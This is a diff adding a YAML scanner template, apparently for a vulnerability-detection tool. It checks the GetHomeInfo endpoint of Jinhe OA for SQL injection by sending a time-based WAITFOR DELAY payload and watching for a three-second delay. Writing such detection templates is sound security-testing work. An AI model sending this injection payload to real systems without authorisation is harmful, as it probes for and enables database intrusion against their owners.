@@ -1,0 +1,17 @@
+name: 金和OA-GetHomeInfo-sql
+description: >-
+  sql注入
+alwaysExecute: false
+timeout: 5
+matchCount: 2
+rules:
+  - method: GET
+    path: /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1%27%3BWAITFOR+DELAY+%270%3A0%3A3%27--
+    expression:
+      status: 200
+      sleep: 3
+  - method: GET
+    path: /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1%27%3BWAITFOR+DELAY+%270%3A0%3A3%27--
+    expression:
+      status: 200
+      sleep: 3
